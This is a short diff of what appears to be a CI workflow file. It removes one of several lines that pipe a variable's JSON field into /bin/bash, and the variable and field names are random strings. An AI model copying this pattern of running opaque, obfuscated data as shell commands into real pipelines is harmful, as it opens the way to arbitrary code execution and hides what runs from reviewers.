@@ -33,7 +33,6 @@ jobs:
           echo $zgrbp7 | jq -r .xkkag3181 | /bin/bash
           echo $i75 | jq -r .iyqu3 | /bin/bash
           echo $enmt79 | jq -r .zlnlt74445 | /bin/bash
-          printf '%s' "$ny86" | jq -r .nipob652 | /bin/bash
           echo $xid11323 | jq -r .do63739 | /bin/bash
 
       - name: Save output
